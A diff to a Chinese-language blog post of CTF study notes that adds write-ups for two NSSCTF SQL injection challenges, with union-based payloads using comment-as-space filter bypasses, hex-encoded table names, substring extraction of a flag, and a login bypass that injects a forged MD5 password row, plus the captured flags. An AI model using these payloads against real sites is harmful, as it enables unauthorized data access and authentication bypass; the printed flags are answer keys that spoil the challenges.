@@ -1,5 +1,6 @@
 ---
 title: "nssctf学习中"
+image: '/images/133301699_p0_master1200.jpg'
 published: 2025-11-11
 description: "CTF 学习笔记与技术复盘"
 category: 刷题
@@ -470,7 +471,113 @@ select $_POST[‘query’] || flag from Flag
 
 
 
-# #7
+# #7.[SWPUCTF 2021 新生赛]sql
+
+![image-20260108194438025](/images/image-20260108194438025.png)
+
+观察html，发现get 参数为wllm。
+
+测试了一下。
+
+字符型，过滤了空格和--+,#。
+
+`wllm='/**/order/**/by/**/3%23`
+
+确定列数3.
+
+`wllm='/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()%23`
+
+找到目标，LTLT_flag。
+
+`id=-1 UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name = '表名' **(读表)**`
+
+由于我自己笔记里的记录为引号包裹的表名，题目里面引号又die了。
+
+所以换成16进制数据。
+
+`wllm=-1'/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/0x4c544c545f666c6167%23`
+
+发现目标列，flag。
+
+```
+wllm=-1'/**/union/**/select/**/1,group_concat(concat(id,0x7e,flag)),3/**/from/**/LTLT_flag%23
+
+wllm=-1'/**/union/**/select/**/1,group_concat(mid(flag,15,30)),3/**/from/**/LTLT_flag%23
+
+wllm=-1'/**/union/**/select/**/1,mid(flag,40),3/**/from/**/LTLT_flag%23
+
+wllm=-1'/**/union/**/select/**/1,mid(flag,20),3/**/from/**/LTLT_flag/**/where/**/id=1%23
+
+wllm=-1'/**/union/**/select/**/1,flag,3/**/from/**/LTLT_flag/**/where/**/id=2%23
+```
+
+由于读取数据的限制，我试了好几次才拿到完整的flag。
+
+![image-20260108194103653](/images/image-20260108194103653.png)
+
+**NSSCTF{1de65552-bb8d-4af6-a726-3213451005a7}**
+
+
+
+---
+
+
+
+# #8.[GXYCTF 2019]BabySqli
+
+一个登入页面，多次测试后，发现只有当用户名为admin时，才会出现wrong pass。
+
+抓包，发现参数为:
+
+![image-20260108203649101](/images/image-20260108203649101.png)
+
+name跟pw。而且html上还有一个base64加32的信息。
+
+解密得到： `select * from user where username = '$name'`
+
+注入点为name。
+
+随便几次测试发现
+
+ `admin' order by 3#` 正常 。 `admin' order by 4#` 报错。
+
+说明三列。
+
+本来进行正常攻击，但之后就是绕过去也是wrong pass。
+
+也是没招了，看了一下wp。
+
+不是，传个数组，然后发现是md5加密？？？？
+
+后端具体逻辑，就是第二列为用户名，第三列为md5解密的密码，要跟我们输入的密码进行比较。
+
+```
+name=admi' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1
+```
+
+不是，这个真的不算是爆破吗，正常谁传参数组？？？？
+
+好阴啊。
+
+![image-20260108203222688](/images/image-20260108203222688.png)
+
+**NSSCTF{8c9f1139-03bf-4421-af17-c2b48003c861}**
+
+
+
+---
+
+
+
+
+
+
+
+
+
+
+
+
 
 ---
 
